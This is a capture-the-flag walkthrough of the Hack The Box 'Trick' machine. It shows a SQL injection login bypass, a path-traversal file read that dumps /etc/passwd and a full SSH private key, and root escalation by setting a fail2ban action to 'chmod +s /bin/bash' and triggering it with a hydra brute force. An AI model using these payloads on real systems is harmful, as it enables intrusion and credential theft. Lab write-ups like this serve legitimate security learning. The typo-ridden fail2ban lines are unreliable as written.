# Trick - HTB(Easy)
## Itay Nafrin | October 18th

### IP = 10.10.11.166

### NMAP
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|http-title: Coming Soon - Start Bootstrap Theme
|http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|  Supported Methods: GET HEAD
|http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel


### DNS ENUM

```
$ nslookup         
> SERVER 10.10.11.166
Default server: 10.10.11.166
Address: 10.10.11.166#53
> 127.0.0.1
1.0.0.127.in-addr.arpa  name = localhost.
> 10.10.11.166
166.11.10.10.in-addr.arpa       name = trick.htb.
>   

```

```
$ dig axfr trick.htb @10.10.11.166

; <<>> DiG 9.18.4-2-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
<strong>preprod-payroll.trick.htb</strong>. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 84 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Tue Oct 18 07:04:25 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)

```

As you can see there are is a domain trick.htb and it's sub domain preprod-payroll add the to the /etc/hosts file.

### Web Enum

When entering http://preprod-payroll.trick.htb you can see a login form but you can bypass it by a simple SQL Injection enter: 
username: ' OR 1=1 -- -
password: sdfsdf

This doesn't lead us to anything so I tried another thing, maybe if I take the top 5000 subdomains file and append it to the preprod- maybe I'll get a new domain to work on.

### Fuzz

```

$ cat subdomains-top1million-5000.txt
preprod-www
preprod-mail
preprod-ftp
preprod-localhost
preprod-webmail
preprod-smtp
preprod-webdisk
preprod-pop
preprod-cpanel
preprod-whm
preprod-ns1
preprod-ns2
preprod-autodiscover
more...

$ wfuzz -c -f sub-fighter -w subdomains-top1million-5000.txt -u 'http://trick.htb' -H "Host: FUZZ.trick.htb" --hw 475
Target: http://trick.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                               

000000254:   200        178 L    631 W      9660 Ch     "preprod-marketing" 

```

Interesting we got a new subdomain.


http://preprod-marketing.trick.htb

So I started doing some recon and saw the `page` parameter interesting, maybe it's vulnerable to LFI:

```
$ wfuzz -c -f lfi-fighter -w /usr/share/wordlists/LFI_payloads.txt -u 'http://preprod-marketing.trick.htb/index.php?page=FUZZ' --hl 0 

Target: http://preprod-marketing.trick.htb/index.php?page=FUZZ
Total requests: 70466

=====================================================================
ID           Response   Lines    Word       Chars       Payload                               

000004790:   200        41 L     68 W       2351 Ch     "/..././..././..././..././..././..././
                                                        ..././..././etc/passwd"               
000012828:   200        41 L     68 W       2351 Ch     "/..././..././..././..././..././..././
                                                        ..././..././etc/passwd" 

```
```
$ curl "preprod-marketing.trick.htb/index.php?page=..././..././..././etc/passwd" | grep bash 
root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash

```

We got a `micheal` user.

```

$ curl "http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

### SSH 

```
$ ssh michael@trick.htb -i id_rsa
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:/home/michael$ whoami && id && cat user.txt && ip a
michael
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
1a32588edc435559fa1592260d78616c
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:eb:a6 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.166/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:eba6/64 scope global dynamic mngtmpaddr 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb9:eba6/64 scope link 
       valid_lft forever preferred_lft forever
```

### Priv Esc

```

$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

fail2ban is a system that identifies a brute-force attack and you can exploit it by changing it's `iptables-multiport.conf` file because it's owned by you. 

1. `nano /etc/fail2ban/action.d/iptables-multiport.conf`
Now you need to edit this:
```

acitonban = chmod +s /bin/bash

actionunbam = chmod +s /bin/bash

```

2. `$ sudo /etc/init.d/fail2ban restart`
3. while your running step number 2 you need to attack the machine via brute-force.
`$ hydra -l 0xfad3 -P /usr/share/wordlist/rockyou.txt ssh://trick.htb`
4. meanwhile /bin/bash file is going to change its permissions 
5. $ bash -p 
`root@trick:~# cat root.txt `
<strong>ee99916ae2ad5baf2ca5da5423b04858</strong>

more info - https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/ & https://youtu.be/vAlkrw-o7m4?t=2247